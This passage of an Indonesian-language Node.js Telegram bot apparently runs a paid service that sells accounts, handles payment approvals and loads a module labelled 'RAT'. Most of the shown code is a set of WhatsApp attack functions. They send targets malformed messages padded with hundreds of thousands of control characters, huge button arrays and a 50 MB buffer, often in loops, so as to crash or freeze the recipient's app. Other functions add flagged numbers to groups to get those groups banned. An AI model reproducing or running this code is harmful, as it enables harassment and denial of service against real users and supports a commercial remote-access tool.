      if (db.find(u => u.username.toLowerCase() === username.toLowerCase())) {
        results.failed.push({ username, reason: "Username sudah terdaftar" });
        continue;
      }

      const password = generateRandomPassword(8);

      const expired = new Date();
      expired.setDate(expired.getDate() + days);

      const expiredDate = expired.toISOString().split('T')[0];

      // ═══ cratevip = VIP = dapat pairId ═══
      db.push({
        username: username,
        password: password,
        role: "vip",
        expiredDate: expiredDate,
        createdAt: new Date().toISOString(),
        createdBy: msg.from.username || msg.from.id.toString(),
        pairId: genPairId()
      });

      try {
        fs.appendFileSync('logUser.txt', `${msg.from.username || msg.from.id} Created ${username} (VIP) at ${new Date().toLocaleString()}\n`);
      } catch (err) {
        console.error("Gagal menulis log:", err);
      }

      results.success.push({
        username: username,
        password: password,
        expired: expiredDate
      });
    }

    saveDatabase(db);

    let responseMessage = `✅ *BERHASIL MEMBUAT VIP ACCOUNT*\n\n`;
    responseMessage += `📅 *Masa Aktif:* ${days} hari\n`;
    responseMessage += `👤 *Dibuat Oleh:* @${msg.from.username || 'Unknown'}\n`;
    responseMessage += `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}\n\n`;

    if (results.success.length > 0) {
      responseMessage += `✅ *Berhasil (${results.success.length}):*\n`;
      results.success.forEach((acc, index) => {
        responseMessage += `${index + 1}. 👤 *${acc.username}*\n`;
        responseMessage += `   🔐 \`${acc.password}\`\n`;
        responseMessage += `   📆 Kadaluarsa: ${acc.expired}\n\n`;
      });
    }

    if (results.failed.length > 0) {
      responseMessage += `❌ *Gagal (${results.failed.length}):*\n`;
      results.failed.forEach((acc, index) => {
        responseMessage += `${index + 1}. 👤 ${acc.username} - ${acc.reason}\n`;
      });
    }

    responseMessage += `\n📌 *Total Akun Dibuat:* ${results.success.length}`;

    await bot.sendMessage(chatId, responseMessage, { parse_mode: "Markdown" });

    if (results.success.length > 0) {
      let fileContent = "🎯 DAFTAR AKUN VIP\n";
      fileContent += "═══════════════════\n";
      fileContent += `📅 Masa Aktif: ${days} hari\n`;
      fileContent += `📆 Kadaluarsa: ${results.success[0].expired}\n`;
      fileContent += `⏰ Dibuat: ${new Date().toLocaleString('id-ID')}\n`;
      fileContent += "═══════════════════\n\n";
      
      results.success.forEach((acc, index) => {
        fileContent += `📌 Akun #${index + 1}\n`;
        fileContent += `👤 Username: ${acc.username}\n`;
        fileContent += `🔐 Password: ${acc.password}\n`;
        fileContent += `─────────────────\n`;
      });

      const fileName = `vip_accounts_${Date.now()}.txt`;
      fs.writeFileSync(fileName, fileContent);
      
      await bot.sendDocument(chatId, fileName, {
        caption: `📁 File backup ${results.success.length} akun VIP`
      });
      
      fs.unlinkSync(fileName);
    }

  } catch (error) {
    console.error("Error dalam perintah cratevip:", error);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses perintah.");
  }
});

bot.onText(/^\/?crateowner([\s\S]*)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1]?.trim();

  if (!input) {
    return bot.sendMessage(chatId,
      "📝 *Cara Penggunaan:*\n\n" +
      "`/crateowner`\n" +
      "MANZ Owner\n" +
      "Madzz Owner\n\n" +
      "📌 *Note:* 999 hari aktif otomatis",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const db = loadDatabase();

    const lines = input
      .split('\n')
      .map(l => l.trim())
      .filter(l => l.length > 0);

    if (lines.length > 50) {
      return bot.sendMessage(chatId, "❌ Maksimal 50 data.");
    }

    for (const line of lines) {
      const parts = line.split(' ');
      let role = parts.pop();
      let username = parts.join(' ');

      if (!username) {
        username = role;
        role = "Owner";
      }

      if (db.find(u => u.username.toLowerCase() === username.toLowerCase())) {
        await bot.sendMessage(chatId,
          `❌ *${username}* sudah terdaftar`,
          { parse_mode: "Markdown" }
        );
        continue;
      }

      const password = generateRandomPassword(8);

      const expired = new Date();
      expired.setDate(expired.getDate() + 999);
      const expiredDate = expired.toISOString().split('T')[0];

      // ═══ crateowner = owner = dapat pairId ═══
      db.push({
        username: username,
        password: password,
        role: role.toLowerCase(),
        expiredDate: expiredDate,
        createdAt: new Date().toISOString(),
        createdBy: msg.from.username || msg.from.id.toString(),
        pairId: genPairId()
      });

      const message =
        `👤 *${username}*\n` +
        `🔐 \`${password}\`\n` +
        `🏷️ ${role}\n` +
        `📆 ${expiredDate}`;

      await bot.sendMessage(chatId, message, {
        parse_mode: "Markdown"
      });

      await new Promise(r => setTimeout(r, 400));
    }

    saveDatabase(db);

    await bot.sendMessage(chatId, "✅ Selesai membuat akun owner (999 hari).");

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error saat proses.");
  }
});

// ── Telegram Command: approve & reject
bot.onText(/^\/?approve\s+(\S+)/i, async (msg, match) => {
  if (msg.from.id !== OWNER_ID) return;
  const id = match[1];
  const purchases = loadPurchases();
  const idx = purchases.findIndex(p => p.payment_id === id);
  if (idx === -1) {
    return bot.sendMessage(msg.chat.id, `❌ ID ${id} tidak ditemukan.`);
  }
  purchases[idx].status = 'success';
  purchases[idx].verified_at = new Date().toISOString();
  purchases[idx].verified_by = msg.from.id;
  savePurchases(purchases);
  bot.sendMessage(msg.chat.id,
    `✅ *PEMBAYARAN DISETUJUI*\n\n` +
    `🆔 ID: \`${id}\`\n` +
    `👤 Nama: ${purchases[idx].name}\n` +
    `📱 WA: ${purchases[idx].phone}\n` +
    `🎯 Role: ${purchases[idx].role}\n\n` +
    `Jangan lupa kirim akun manual ke user ya!`,
    { parse_mode: 'Markdown' });
});

bot.onText(/^\/?reject\s+(\S+)/i, async (msg, match) => {
  if (msg.from.id !== OWNER_ID) return;
  const id = match[1];
  const purchases = loadPurchases();
  const idx = purchases.findIndex(p => p.payment_id === id);
  if (idx === -1) {
    return bot.sendMessage(msg.chat.id, `❌ ID ${id} tidak ditemukan.`);
  }
  purchases[idx].status = 'rejected';
  purchases[idx].verified_at = new Date().toISOString();
  purchases[idx].verified_by = msg.from.id;
  savePurchases(purchases);
  bot.sendMessage(msg.chat.id,
    `❌ *PEMBAYARAN DITOLAK*\n\n` +
    `🆔 ID: \`${id}\`\n` +
    `👤 Nama: ${purchases[idx].name}`,
    { parse_mode: 'Markdown' });
});

// Command manual backup via Telegram
bot.onText(/^\/?backupdb$/, async (msg) => {
  const chatId = msg.chat.id;
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
  }
  
  try {
    const dbPath = path.join(__dirname, 'database.json');
    
    if (!fs.existsSync(dbPath)) {
      return bot.sendMessage(chatId, "❌ database.json tidak ditemukan.");
    }
    
    await bot.sendDocument(chatId, dbPath, {
      caption: `📦 *BACKUP DATABASE MANUAL*\n🕐 ${new Date().toLocaleString('id-ID')}`,
      parse_mode: 'Markdown'
    });
    
    await bot.sendMessage(chatId, "✅ Database berhasil dikirim!");
    
  } catch (error) {
    await bot.sendMessage(chatId, `❌ Gagal: ${error.message}`);
  }
});

async function FreezeDelayinvisHard(sock, target) {
  try {
    const kontolu = {
      bloksNestedContainer: {
        root: {
          id: '\u2060'.repeat(50000),
          child: {
            id: '\uFEFF'.repeat(50000),
            child: {
              id: '\u034F'.repeat(50000),
              child: {
                id: '\u061C'.repeat(50000),
                child: {
                  id: '\u202E'.repeat(50000),
                  child: {
                    id: '\u202D'.repeat(50000),
                    child: {
                      id: '\u3164'.repeat(50000),
                      data: ' '.repeat(500000)
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, kontolu, {
      participant: { jid: target }
    });
  } catch (e) {}
}

async function FcK7(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "\u0070".repeat(50000),
            subtitle: "\x10".repeat(50000),
            bloksWidget: {
              uuid: "\u200B".repeat(50000),
              data: "[".repeat(50001),
              type: "\u200F".repeat(50000),
              fallback: "\u200D".repeat(50000)
            }
          },
          body: { text: "\u000F" },
          nativeFlowMessage: {
            buttons: "[".repeat(50000)
          }
        }
      }
    }
  }, { participant: true });
}

async function VnXFcClickAfterClickButtonsOrder(sock, target) {
  try {
    await sock.relayMessage(target, {
      interactiveMessage: {
        header: {
          title: "azx Script"
        },
        body: {
          text: "azx Anti Ampas"
        },
        footer: {
          text: "By @azx"
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "order_status",
 buttonParamsJson: JSON.stringify({
 order_id: "\0".repeat(55000),
 order_title: "\0".repeat(55000),
 status: "PROCESSING",
 token: "sgL4_dxscbfayun",
 flow_message_version: "1"
              })
            }
          ],
          messageParamsJson: "{}"
        }
      }
    }, {});

    console.log("✅ VnX Success");
  } catch (e) {
    console.error("❌ Gagal mengirim pesan:", e);
  }
}

async function delyblnk(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "heyy im back"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({
                            name: "cta_call",
                            buttonParamsJson: JSON.stringify({
                                display_text: "exx",
                                phone_number: "0000000000000"
                            })
                        }))
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, {});
}

async function Delay(sock, target) {
    const jid = target.includes("@") ? target : target + "@s.whatsapp.net";

    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Halo Bang"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 400000 }, () => ({})),
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\n".repeat(99999),
                            id: "\u0000".repeat(99999),
                            flow_token: "\r".repeat(99999)
                        })
                    }
                }
            }
        }
    };

    const msg2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𝐗𝐀‌𝐅𝐈𝐄𝐑𝐈 𝐂‌𝒓𝒂‌‌𝒔𝒉ཀ‌‌';"
                    },
                    nativeFlowMessage: {
                        buttons: "{".repeat(500000),
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\n".repeat(99999),
                            id: "\u0000".repeat(99999),
                            flow_token: "\r".repeat(99999)
                        })
                    },
                    interactiveMessage: {
                        body: {
                            text: "Creadit @Diks404"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                        nativeFlowResponseMessage: {
                            buttons: [
                                { name: "one_crash_message" },
                                { name: "booking_status", bookingId: "succes" },
                                { name: "voice_call", phone_number: "62888888888" },
                                { name: "cta_copy" }
                            ]
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, msg, {});
    await sock.relayMessage(jid, msg2, {});
}

async function paysply(sock, target) {
  const teks = "\n\0".repeat(400000);

  const msg1 = {
    groupMentionedMessage: {
      message: {
        splitPaymentMessage: {
          splitId: "\0".repeat(7000),
          totalAmount: { value: null, offset: null, currencyCode: "DOLAR" },
          decription: teks,
          requesterJid: null,
          participants: Array.from({ length: 20000 }, () => ({ jid: null, amount: null, status: "PENDING" })),
          createdAtMs: Date.now(),
          contextInfo: {
            participant: target,
            stanzaId: "ABCDEF12345",
            quotedMessage: {
              statusLinkPreviewMetadata: {
                style: "FULL"
              }
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 100; i++) {
    await sock.relayMessage(target,
      msg1, {
        noSelfSync: true,
      }
    );
  }
}

async function DelayV7(sock, target) {
  const XGren = proto.Message.encode(
    proto.Message.fromObject({
      interactiveMessage: {
        body: { text: "Mak Lu ampas jembut😎" + "\0".repeat(30000) },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_call",
              buttonParamsJson: JSON.stringify({
                display_text: "\u200B".repeat(50000),
                phone_number: "00000000000000"
              })
            }
          ],
          messageVersion: 3
        },
        contextInfo: {
          isForwarded: true,
          mentionedJid: Array.from({ length: 5000 }, () =>
            `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`
          )
        }
      }
    })
  ).finish();

  const jid = String(target).includes("@")
    ? String(target)
    : String(target).replace(/\D/g, "") + "@s.whatsapp.net";

  await sock.relayMessage(jid, proto.Message.decode(XGren), {
    messageId: "FG" + Date.now().toString(36).toUpperCase()
  });

  console.log(`Delay terkirim ke ${jid}`);
}

async function crLOverFlow(sock, target) {
  for (let i = 0; i < 100; i++) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      title: " X#L ",
      header: {},
      carouselMessage: {},
      body: {
        text: " \r "
      },
      bloksWidget: {
        uuid: "cw-a2ui-4",
        data: "[".repeat(200000),
        type: "im_a2ui",
        fallback: "A2UI"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "request_contact_info",
            buttonParamsJson: "{}"
          }
        ]
      },
      messageParamsJson: "{}"
    }
  }, {
    isSecret: true
  })
}}

async function Delay1(sock, target) {
    const jid = target.includes("@") ? target : target + "@s.whatsapp.net";

    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Halo Bang"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 400000 }, () => ({})),
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\n".repeat(99999),
                            id: "\u0000".repeat(99999),
                            flow_token: "\r".repeat(99999)
                        })
                    }
                }
            }
        }
    };

    const msg2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𝐗𝐀‌𝐅𝐈𝐄𝐑𝐈 𝐂‌𝒓𝒂‌‌𝒔𝒉ཀ‌‌';"
                    },
                    nativeFlowMessage: {
                        buttons: "{".repeat(500000),
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\n".repeat(99999),
                            id: "\u0000".repeat(99999),
                            flow_token: "\r".repeat(99999)
                        })
                    },
                    interactiveMessage: {
                        body: {
                            text: "Creadit @Diks404"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                        nativeFlowResponseMessage: {
                            buttons: [
                                { name: "one_crash_message" },
                                { name: "booking_status", bookingId: "succes" },
                                { name: "voice_call", phone_number: "62888888888" },
                                { name: "cta_copy" }
                            ]
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, msg, {});
    await sock.relayMessage(jid, msg2, {});
}

async function xfc(sock, target) {
    for (let i = 0; i < 100; i++) {
        const x = generateWAMessageFromContent(target, {
            bloksNestedContainer: {
                root: {
                    id: "\u2060".repeat(100000),
                    child: {
                        id: "\uFEFF".repeat(100000),
                        child: {
                            id: "\u034F".repeat(100000),
                            child: {
                                id: "\u061C".repeat(100000),
                                child: {
                                    id: "\u202E".repeat(100000),
                                    child: {
                                        id: "\u202D".repeat(100000),
                                        child: {
                                            id: "\u2060".repeat(100000),
                                            child: {
                                                id: "\uFEFF".repeat(100000),
                                                child: {
                                                    id: "\u034F".repeat(100000),
                                                    child: {
                                                        id: "\u061C".repeat(100000),
                                                        child: {
                                                            id: "\u202E".repeat(100000),
                                                            child: {
                                                                id: "\u202D".repeat(100000),
                                                                child: {
                                                                    id: "\u2060".repeat(100000),
                                                                    child: {
                                                                        id: "\uFEFF".repeat(100000),
                                                                        child: {
                                                                            id: "\u034F".repeat(100000)
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }, {});
        await sock.relayMessage(target, x.message, {
            participant: target,
            messageId: x.key.id
        });
        await new Promise(r => setTimeout(r, 3000));
    }
}
async function eradigital(sock, target) {
  const xx = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: " hihi " },
          nativeFlowMessage: {
            buttons: "{".repeat(500000),
          },
        },
      },
    },
  };

  const x = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "hii" },
          nativeFlowMessage: {
            buttons: "{}".repeat(500000),
          },
        },
      },
    },
  };

  try {
    const msg1 = generateWAMessageFromContent(target, xx, {});
    await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });

    await new Promise((resolve) => setTimeout(resolve, 500));

    const msg2 = generateWAMessageFromContent(target, x, {});
    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id });
  } catch (error) {
    console.error("Error to sending your bug:", error);
  }
}

async function DelayFreze(sock, target) {
const CrBLock = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "Aholyy"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
contactMessage: {
displayName: "x",
vcard: null
},
},
},
},
},
},
};
const Crb = generateWAMessageFromContent(target, CrBLock, {});
await sock.relayMessage(target, Crb.message, {
messageId: Crb.key.id
})
}

async function BlankXaka(sock, target) {
  const msg = {
    interactiveMessage: {
      body: {
        text: "?⃟꙰ Ϟ 𝐤! 𝐀 ✶⤻꙳‌‌༑ᐧ‌⌁⃰meta ai🏄‍♂️"
      },
      nativeFlowMessage: {
        name: "beta_mesaage",
        buttons: Array.from({ length: 50001 }, () => ({})),
        extra1: "\u0000".repeat(20000),
        extra2: "\u0000".repeat(60000),
        extra3: "\u0000".repeat(40000),
        extra4: "\u0000".repeat(45000)
      }
    }
  };

  const msg2 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: " 🩸⃟༑⌁⃰Monarc 𝐂𝐨𝐝𝐞𝐱ཀ‌‌🦠 " + "\n" },
          nativeFlowMessage: {
            messageParamsJson: "[".repeat(10000),
            buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {});
  console.log("success send to target");
}

async function Fclunihh(sock, target) {
    try {
        const opo = {
            aiMetadata: {
                protocolMessage: {
                    type: 35,
                    aiMetadataOperation: {
                        hatchMetadataSync: {
                            data: Buffer.alloc(50 * 1024 * 1024, 0x41),
                            timestampMs: Date.now(),
                            requestId: "\u2069".repeat(10000)
                        },
                        bizAiMetadataSync: {
                            serverEvent: {
                                protocolEvent: 1,
                                agentOnboardingStarted: {
                                    composerBlockDurationSecs: 999999999
                                }
                            }
                        }
                    }
                }
            },
            aiMedia: {
                protocolMessage: {
                    type: 31,
                    aiMediaCollectionMessage: {
                        collectionId: "\u2066".repeat(10000),
                        expectedMediaCount: 4294967295,
                        hasGlobalCaption: true
                    }
                }
            },
            latexRCE: {
                botForwardedMessage: {
                    message: {
                        richResponseMessage: {
                            messageType: 1,
                            submessages: Array.from({ length: 1000 }, () => ({
                                messageType: 2,
                                messageText: "\u2069".repeat(10000)
                            }))
                        }
                    }
                }
            }
        };
        const memek = generateWAMessageFromContent(target, opo, {});
        await sock.relayMessage(target, memek.message, {
            messageId: memek.key.id,
            participant: { jid: target }
        });
    } catch (e) {
        console.error("fix sendiri lu kan dep", e);
    }
}

async function MakloGwBan(sock, target) {
    if (!target || !target.endsWith("@g.us")) {
        throw new Error("Target harus berformat @g.us");
    }

    try {
        const illegalNumbers = [
            "13135550002@s.whatsapp.net",
            "12345678900@s.whatsapp.net",
            "19876543210@s.whatsapp.net",
            "15551234567@s.whatsapp.net",
            "18005551234@s.whatsapp.net",
            "447700900000@s.whatsapp.net",
            "447700900001@s.whatsapp.net",
            "447700900002@s.whatsapp.net",
            "971500000000@s.whatsapp.net",
            "971500000001@s.whatsapp.net",
        ];
        await Promise.all(
            illegalNumbers.map(num =>
                sock.groupParticipantsUpdate(target, [num], "add").catch(() => {})
            )
        );

        console.log(`✅ Group ban success: ${target}`);
        return true;

    } catch (e) {
        console.log(`❌ Group ban failed: ${e.message}`);
        throw e;
    }
}

async function groupBan1(sock, groupJid) {
  const startTime = Date.now();
  const duration = 3 * 60 * 1000; // 3 menit

  console.log(chalk.blue(`🚫 Memulai GROUP BAN ke ${groupJid}`));

  if (!groupJid.endsWith("@g.us")) {
    console.log(chalk.red(`❌ Target ${groupJid} bukan ID grup (@g.us)`));
    throw new Error("@g.us server required");
  }

  let successCount = 0;
  let failCount = 0;

  while (Date.now() - startTime < duration) {
    try {
      await sock.groupParticipantsUpdate(
        groupJid,
        ["18188880008@s.whatsapp.net"],
        "add",
      );

      await sock.sendPresenceUpdate("composing", groupJid);

      await sock.groupParticipantsUpdate(
        groupJid,
        ["13135550002@s.whatsapp.net"],
        "add",
      );

      successCount++;
      console.log(chalk.green(`✅ GROUP BAN berhasil [${successCount}]`));
    } catch (err) {
      failCount++;
      console.log(chalk.red(`❌ GROUP BAN gagal: ${err.message}`));
    }

    await sleep(10000);
  }

  console.log(
    chalk.yellow(
      `📊 GROUP BAN selesai! ✅ ${successCount} berhasil | ❌ ${failCount} gagal → ${groupJid}`,
    ),
  );
}

function generateRandomPassword(length = 8) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let password = '';
  for (let i = 0; i < length; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return password;
}

// ═══════════════════════════════════════════════════════════
// RAT MODULE INIT — 1 port, share server yang sama
// ═══════════════════════════════════════════════════════════
const ratModule = require('./rat');
const ratInstance = ratModule.init(app, server, {
  activeKeys,
  loadDatabase,
  saveDatabase,
});
const genPairId = ratInstance.genPairId;
const isRatPrivileged = ratInstance.isRatPrivileged;
// ═══ END RAT MODULE INIT ═══

// ===== RUN STAFF BOT =====
try {
  require('./bot');
  console.log('✅ Staff Bot loaded from index.js');
} catch (error) {
  console.error('❌ Failed to load Staff Bot:', error.message);
}

bot.on("polling_error", (err) => {
   console.log("POLLING ERROR FULL:", err);
});

bot.on("webhook_error", (err) => {
   console.log("WEBHOOK ERROR:", err);
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://localhost:${wsPort}`);
  console.log(`[WA] Raw WebSocket aktif di ws://localhost:${wsPort}`);
  console.log(`[RAT] Socket.io aktif di ws://localhost:${wsPort}/socket.io`);
  console.log(`[RAT] Endpoint /api/*, /rat/* aktif di port ${wsPort}`);
  console.log(`[RAT] Role privileged: vip, reseller, owner, founder, admin`);
  console.log(`[RAT] Role member: DIBLOKIR dari RAT`);
  startUserSessions()
});






